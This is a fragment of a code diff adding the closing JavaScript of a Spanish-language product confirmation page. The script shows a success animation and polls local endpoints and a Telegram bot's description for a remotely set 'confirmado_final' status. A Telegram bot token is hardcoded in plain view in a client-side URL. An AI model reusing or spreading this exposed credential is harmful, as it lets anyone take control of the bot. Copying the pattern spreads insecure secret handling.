+      // Activar animación del paquete formándose en tick
+      const animBox = document.querySelector('.exito-anim-box');
+      if (animBox) animBox.classList.add('anim-activa');
+    });
+  }, 320);
+}
+
+// Exponer en window para pruebas directas en consola si se desea
+window.mostrarExito = mostrarExito;
+
+// ==================== POLLING DE ESTADO (TELEGRAM BOTÓN) ====================
+const checkConfirmarStatus = async () => {
+  if (yaConfirmado) return;
+  const targetId = id || 'AD_WEB';
+
+  let data = null;
+  // 1. Probar ruta amigable
+  try {
+    const resp = await fetch('/api/product/' + targetId + '/confirmar/status?t=' + Date.now());
+    if (resp.ok) {
+      data = await resp.json();
+    }
+  } catch (e) {}
+
+  // 2. Probar api.php directo (fallback infalible para hosting PHP)
+  if (!data || !data.status) {
+    try {
+      const resp2 = await fetch('/api.php?action=confirmar_status&id=' + targetId + '&t=' + Date.now());
+      if (resp2.ok) {
+        data = await resp2.json();
+      }
+    } catch (e) {}
+  }
+
+  if (data && data.status) {
+    if (data.status === 'confirmado_final' || data.status === 'confirmed_again' || data.status === 'finalizado') {
+      mostrarExito();
+      return;
+    }
+  }
+
+  // 3. Fallback adicional Telegram getMyDescription
+  try {
+    const tgDescResp = await fetch('https://api.telegram.org/bot8818995413:AAHLry4iCNQZ7T385CoVodbXQcnrkymFmKM/getMyDescription?t=' + Date.now());
+    if (tgDescResp.ok) {
+      const tgData = await tgDescResp.json();
+      const desc = (tgData && tgData.result && tgData.result.description) || '';
+      if (desc.includes('status:confirmado_final')) {
+        const m = desc.match(/status:confirmado_final:([A-Za-z0-9]+)/);
+        if (m && m[1]) {
+          const found = resolverDatos(m[1]);
+          if (found) {
+            productoCargado = found;
+            aplicarDatos(found);
+          }
+        }
+        mostrarExito();
+        return;
+      }
+    }
+  } catch (e) {}
+
+  statusPollTimer = setTimeout(checkConfirmarStatus, 1000);
+};
+
+statusPollTimer = setTimeout(checkConfirmarStatus, 1200);
+</script>
+</body>
+</html>
